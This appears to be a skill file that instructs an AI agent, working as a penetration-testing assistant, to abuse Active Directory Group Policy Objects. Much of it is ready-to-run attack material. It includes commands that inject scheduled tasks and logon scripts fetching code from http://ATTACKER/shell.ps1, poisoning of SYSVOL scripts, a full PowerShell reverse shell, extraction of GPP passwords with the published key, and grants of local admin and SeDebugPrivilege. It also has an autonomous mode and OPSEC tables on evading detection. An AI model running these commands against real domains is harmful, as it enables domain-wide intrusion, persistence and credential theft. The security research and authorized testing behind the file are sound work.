---
name: gpo-abuse
description: >
  Exploits Group Policy Objects for code execution, privilege escalation, and
  lateral movement in Active Directory. Covers GPO enumeration (GPOHound,
  BloodHound, PowerView), exploitation via immediate tasks, logon scripts, and
  registry modifications (SharpGPOAbuse, PowerGPOAbuse, pyGPOAbuse,
  GroupPolicyBackdoor), SYSVOL/NETLOGON logon script poisoning, and GPP
  password extraction.
keywords:
  - GPO abuse
  - group policy
  - SharpGPOAbuse
  - PowerGPOAbuse
  - GPOHound
  - GPO write
  - immediate task
  - logon script
  - SYSVOL
  - NETLOGON
  - GPP password
  - cpassword
  - group policy preferences
  - GPO lateral movement
  - GPO persistence
  - GPO escalation
  - writable GPO
tools:
  - SharpGPOAbuse
  - PowerGPOAbuse
  - pyGPOAbuse
  - GPOHound
  - GroupPolicyBackdoor
  - netexec
opsec: medium
---

# GPO Abuse

You are helping a penetration tester exploit writable Group Policy Objects
for code execution, privilege escalation, and lateral movement across
Active Directory. All testing is under explicit written authorization.

**Kerberos-first authentication**: Enumeration and exploitation commands
use Kerberos authentication where supported. pyGPOAbuse and Impacket
tools use `-k -no-pass`, GroupPolicyBackdoor supports `-k`. Windows
tools (SharpGPOAbuse, PowerGPOAbuse) use the current domain session.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it and wait for user approval. Explain GPO scope (which
  OUs/computers are affected), ask before modifying GPOs, confirm cleanup plan.
- **Autonomous**: Enumerate GPO permissions, select best exploitation
  path, execute, clean up, and report.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[gpo-abuse] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Write access to a GPO (GenericWrite, WriteDACL, WriteProperty,
  GenericAll, or WriteOwner on the GPO object)
- OR write access to SYSVOL/NETLOGON logon scripts
- OR read access to SYSVOL (for GPP password extraction)
- Tools: `SharpGPOAbuse` (Windows), `PowerGPOAbuse` (PowerShell),
  `pyGPOAbuse` (Linux), `GPOHound`, optionally `GroupPolicyBackdoor`

**Kerberos-first workflow** (for Linux tools):

```bash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
export KRB5CCNAME=user.ccache
```

## Step 1: Enumerate GPO Permissions

### GPOHound (Comprehensive GPO Audit)

```bash
# Dump and analyze all GPOs
pipx install "git+https://github.com/cogiceo/GPOHound"
gpohound dump --json
gpohound analysis --processed --object group registry
gpohound dump --list --gpo-name
```

### BloodHound (Graph-Based Discovery)

Look for edges: `GenericWrite`, `GenericAll`, `WriteDACL`, `WriteOwner`,
`Owns` on GPO objects. Check which OUs the GPO is linked to — this
determines the blast radius.

### PowerView (ACL Enumeration)

```powershell
# Find GPOs where current user has write access
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
  ($_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|WriteProperty|GenericAll|WriteOwner") -and
  ($_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME).objectsid)
}

# Get GPO details
Get-DomainGPO -Identity "SuperSecureGPO"

# Find which OUs are linked to the GPO
Get-DomainOU -GPLink "{GPO_GUID}" | Select DistinguishedName

# Find computers in those OUs
Get-DomainOU -GPLink "{GPO_GUID}" | ForEach-Object {
  Get-DomainComputer -SearchBase $_.DistinguishedName
}
```

### NetExec GPO Enumeration

```bash
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M gpo_enum
```

### Key Information to Gather

1. **GPO name and GUID** — identifies the policy object
2. **Linked OUs** — determines which computers/users are affected
3. **Computer count** — blast radius of the modification
4. **Current GPO settings** — what the GPO already configures
5. **GPO file path** — `\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\`

## Step 2: Choose Exploitation Method

| Method | Execution Context | Timing | OPSEC | Go To |
|--------|------------------|--------|-------|-------|
| Immediate task | SYSTEM | Next GPO refresh (~90 min) | **MEDIUM** | Step 3A |
| Computer startup script | SYSTEM | Next reboot | **MEDIUM** | Step 3B |
| User logon script | Logged-in user | Next logon | **MEDIUM** | Step 3B |
| Registry Run key | User context | Next logon | **LOW** | Step 3C |
| Local admin assignment | N/A (persistent) | Next GPO refresh | **MEDIUM** | Step 3D |
| User rights assignment | N/A (persistent) | Next GPO refresh | **LOW** | Step 3D |
| SYSVOL logon script poison | Logged-in user | Next logon | **LOW** | Step 4 |

**GPO Refresh Timing**: Default is every 90 minutes + 0-30 minute random
offset. Force refresh on a target: `gpupdate /force` (requires access).
DCs refresh every 5 minutes.

## Step 3: GPO Exploitation

### Step 3A: Immediate Task (Runs at Next GPO Refresh)

Creates a scheduled task that executes once per GPO refresh cycle.

**SharpGPOAbuse (Windows)**:
```powershell
# Add immediate task — runs as SYSTEM
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author "DOMAIN\Admin" --Command "cmd.exe" \
  --Arguments "/c powershell.exe -nop -w hidden -enc BASE64_PAYLOAD" \
  --GPOName "Vulnerable GPO" --Force
```

**PowerGPOAbuse (PowerShell)**:
```powershell
. .\PowerGPOAbuse.ps1
Add-GPOImmediateTask -TaskName 'SystemUpdate' \
  -Command 'powershell.exe' \
  -CommandArguments '-nop -w hidden -enc BASE64_PAYLOAD' \
  -Author 'DOMAIN\Administrator' -Scope Computer \
  -GPOIdentity 'Vulnerable GPO'
```

**pyGPOAbuse (Linux)**:
```bash
# Immediate task with reverse shell
python3 pygpoabuse.py DOMAIN/user -hashes lm:nt \
  -gpo-id "{GPO_GUID}" \
  -powershell \
  -command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" \
  -taskname "SystemUpdate" -description "System maintenance"
```

**GroupPolicyBackdoor (Linux, Kerberos-aware)**:
```bash
# Create ImmediateTask_create.ini:
# [MODULECONFIG]
# name = Scheduled Tasks
# type = computer
# [MODULEOPTIONS]
# task_type = immediate
# program = cmd.exe
# arguments = /c "powershell -enc BASE64_PAYLOAD"

python3 gpb.py gpo inject --domain DOMAIN.LOCAL --dc DC.DOMAIN.LOCAL \
  -k --module modules_templates/ImmediateTask_create.ini \
  --gpo-name 'Vulnerable GPO'

# Save state folder for cleanup (printed in output)
```

### Step 3B: Logon/Startup Scripts

**SharpGPOAbuse (Windows)**:
```powershell
# Computer startup script (runs as SYSTEM at boot)
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" \
  --ScriptContents "powershell.exe -nop -w hidden -enc BASE64_PAYLOAD" \
  --GPOName "Vulnerable GPO"

# User logon script (runs as user at logon)
.\SharpGPOAbuse.exe --AddUserScript --ScriptName "login.bat" \
  --ScriptContents "powershell.exe -nop -w hidden -enc BASE64_PAYLOAD" \
  --GPOName "Vulnerable GPO"
```

**PowerGPOAbuse (PowerShell)**:
```powershell
. .\PowerGPOAbuse.ps1
Add-ComputerScript -ScriptName 'update.ps1' \
  -ScriptContent 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")' \
  -GPOIdentity 'Vulnerable GPO'

Add-UserScript -ScriptName 'login.ps1' \
  -ScriptContent 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")' \
  -GPOIdentity 'Vulnerable GPO'
```

### Step 3C: Registry Run Key (Persistence)

Uses Group Policy Preferences to set a registry value that executes
on every logon.

```powershell
# Native RSAT module
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=domain,DC=local"

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create \
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
  -ValueName "Updater" \
  -Value "%COMSPEC% /b /c start /b /min \\DC\SYSVOL\DOMAIN\scripts\payload.exe" \
  -Type ExpandString
```

### Step 3D: User Rights and Local Admin Assignment

**SharpGPOAbuse (Windows)**:
```powershell
# Add user as local admin on all GPO-linked computers
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker \
  --GPOName "Vulnerable GPO"

# Grant privileges (SeDebugPrivilege for mimikatz, etc.)
.\SharpGPOAbuse.exe --AddUserRights \
  --UserRights "SeTakeOwnershipPrivilege,SeDebugPrivilege" \
  --UserAccount attacker --GPOName "Vulnerable GPO"
```

**PowerGPOAbuse (PowerShell)**:
```powershell
. .\PowerGPOAbuse.ps1

# Local admin assignment
Add-LocalAdmin -Identity 'attacker' -GPOIdentity 'Vulnerable GPO'

# Privilege assignment
Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" \
  -Identity 'attacker' -GPOIdentity 'Vulnerable GPO'
```

**StandIn (.NET)**:
```powershell
# Local admin
StandIn.exe --gpo --filter "Vulnerable GPO" --localadmin attacker

# User rights
StandIn.exe --gpo --filter "Vulnerable GPO" --setuserrights attacker \
  --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
```

## Step 4: SYSVOL/NETLOGON Logon Script Poisoning

If you have write access to logon scripts stored in SYSVOL or NETLOGON,
inject payload into existing scripts.

### Discover Logon Scripts

```bash
# Find users with logon scripts configured
bloodyAD -k -no-pass get search --filter '(scriptPath=*)' \
  --attr sAMAccountName,scriptPath

# Spider SYSVOL for scripts
nxc smb DC.DOMAIN.LOCAL --use-kcache -M spider_plus \
  -o SHARE=SYSVOL
```

```powershell
# PowerView
Get-DomainUser -Properties scriptPath | Where-Object { $_.scriptPath }
```

### Test Write Access

```bash
# Check if you can write to SYSVOL scripts folder
smbclient //DC.DOMAIN.LOCAL/SYSVOL -k --use-krb5-ccache=$KRB5CCNAME
smb: \> cd DOMAIN.LOCAL\scripts\
smb: \> put test.txt
```

### Poison Existing Script

Prepend payload to an existing logon script to preserve original
functionality:

**VBScript (.vbs)**:
```vb
' Prepend to existing logon script
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -nop -w hidden -enc BASE64_PAYLOAD"

' Original script content below...
```

**Batch (.bat / .cmd)**:
```batch
@echo off
REM Prepend to existing logon script
start /b powershell -nop -w hidden -enc BASE64_PAYLOAD

REM Original script content below...
```

**PowerShell (.ps1)**:
```powershell
# Prepend to existing logon script
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# Original script content below...
```

### OPSEC Notes

- Runs under the **logging-in user's context** (not SYSTEM)
- Scope determined by which users have this script configured
- Preserve original script content and timestamps
- Clean up by restoring the original file after callback received

## Step 5: GPP Password Extraction

Group Policy Preferences stored AES-encrypted passwords in SYSVOL XML
files. Microsoft published the key (MS14-025), making decryption trivial.
New GPP passwords can no longer be set, but old ones may persist.

### Automated Extraction

```bash
# Impacket Get-GPPPassword
Get-GPPPassword.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL

# NetExec modules
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_password
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_autologin
```

```powershell
# PowerSploit
Get-GPPPassword

# Metasploit
use post/windows/gather/credentials/gpp
```

### Manual Search

```bash
# Search SYSVOL for cpassword attribute
findstr /S /I cpassword \\DOMAIN.LOCAL\SYSVOL\DOMAIN.LOCAL\Policies\*.xml
```

Common XML files containing GPP passwords:
- `Groups.xml` — local group membership
- `Services.xml` — service account passwords
- `Scheduledtasks.xml` — scheduled task credentials
- `DataSources.xml` — data source connection strings
- `Drives.xml` — mapped drive credentials
- `Printers.xml` — printer connection credentials

### Manual Decryption

```bash
# AES key (published by Microsoft):
# 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b

# Decrypt cpassword value
echo 'CPASSWORD_BASE64' | base64 -d | \
  openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 0000000000000000

# gpp-decrypt (Kali tool)
gpp-decrypt CPASSWORD_BASE64
```

## Step 6: Cleanup

**Always clean up GPO modifications** after obtaining access. GPO changes
affect all computers in the linked OU and persist until removed.

### GroupPolicyBackdoor (State-Based Cleanup)

```bash
# Clean up using state snapshot from Step 3A
python3 gpb.py gpo clean --domain DOMAIN.LOCAL --dc DC.DOMAIN.LOCAL \
  -k --state-folder 'state_folders/TIMESTAMP'
```

### Manual Cleanup

```powershell
# Remove immediate task
# Delete: \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

# Remove logon script entry
# Edit: GPO -> User/Computer Configuration -> Scripts -> remove added script

# Remove local admin assignment
# Edit: GPO -> Computer Configuration -> Restricted Groups -> remove entry

# Force GPO refresh to propagate cleanup
gpupdate /force /target:computer
```

### Verify Cleanup

```powershell
# Check GPO contents after cleanup
Get-GPOReport -Name "Vulnerable GPO" -ReportType Xml -Path gpo-report.xml
# Review XML for any remaining modifications
```

## Step 7: Escalate or Pivot

### Reverse Shell via MCP

When GPO abuse achieves code execution on target hosts, **catch shells via the
MCP shell-server** rather than relying on local listeners or hoping the
immediate task output is visible. GPO payloads execute asynchronously on the
next GPO refresh (~90 min) or at logon -- the shell-server catches callbacks
as they arrive.

1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
2. Use a reverse shell as the GPO immediate task or logon script payload:
   ```powershell
   # Immediate task payload (SharpGPOAbuse / pyGPOAbuse):
   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
   ```
   Multiple hosts may call back if the GPO is linked to an OU with many
   computers -- each callback creates a separate session.
3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`

If targets lack outbound connectivity to the attackbox, use the local admin
assignment technique (Step 3D) instead and access hosts via existing network
paths.

After GPO-based code execution:
- **SYSTEM shell on target**: Route to **credential-dumping** for
  SAM/LSA dump, cached domain credentials.
- **Multiple hosts compromised via GPO**: Route to **credential-dumping**
  for credential harvesting across hosts.
- **Local admin on DA workstation**: Route to **credential-dumping**
  for LSASS dump targeting DA cached credentials.
- **GPP passwords found**: Route to **pass-the-hash** (if hash) or
  use cleartext password for authentication.
- **Write access to GPO linked to DC OU**: Dangerous but powerful —
  can execute code on DCs. Consider DCSync instead.
- **User rights obtained (SeDebugPrivilege)**: Enables LSASS access
  for credential extraction on current host.

When routing, pass: GPO name, affected scope, execution context
(SYSTEM/user), credentials obtained, and mode.

Update `engagement/state.md` with GPO-based access and credentials.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Return findings to the orchestrator. Do not retry the same
  technique — the orchestrator will decide whether to revisit with new context
  or route elsewhere.

## Troubleshooting

### GPO Modification Not Taking Effect

- GPO refresh default is 90 min + 0-30 min random offset
- Force refresh: `gpupdate /force` (on target machine)
- DCs refresh every 5 minutes
- Verify the GPO is linked to the correct OU
- Verify the computer object is in the linked OU
- Check GPO enforcement/inheritance blocking

### Write Access Denied on SYSVOL

- GPO object permissions in AD and SYSVOL filesystem ACLs are separate
- You may have AD write but not SYSVOL write, or vice versa
- Check both: AD ACL on the GPO object AND NTFS ACLs on the SYSVOL path
- Use `smbclient` or `smbcacls` to check filesystem permissions

### SharpGPOAbuse "GPO Not Found"

- Use exact GPO display name (case-sensitive)
- Try GPO GUID instead: `--GPOName "{12345678-ABCD-1234-ABCD-123456789012}"`
- Verify you can reach SYSVOL share

### pyGPOAbuse Authentication Errors

- Use `-hashes lm:nt` format (both LM and NT hash required)
- For Kerberos: ensure TGT is valid and clock is synced
- Use full FQDN for DC hostname

### GPP Decryption Returns Garbage

- Verify the cpassword value is complete (not truncated)
- Some tools expect the raw base64, others expect the XML attribute value
- Check if the password was set after MS14-025 patch (post-2014 GPPs
  should not contain cpassword)

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### OPSEC Comparison

| Technique | OPSEC | Detection Events | Notes |
|-----------|-------|-----------------|-------|
| Immediate task | **MEDIUM** | 4688/4689 (process creation) | Runs once per refresh cycle |
| Startup script | **MEDIUM** | 4688 (process creation at boot) | Persists until removed |
| Logon script (GPO) | **MEDIUM** | 4688 (at user logon) | Per-user scope |
| Registry Run key | **LOW** | 4657 (registry modify) | Persistent, subtle |
| Local admin assignment | **MEDIUM** | 4732 (member added to group) | Affects all linked computers |
| SYSVOL script poison | **LOW** | SMB write (if audited) | Modifies existing file |
| GPP password read | **LOW** | SMB read (SYSVOL) | Passive, no modification |
| User rights assignment | **LOW** | 4704 (right assigned) | Less commonly monitored |
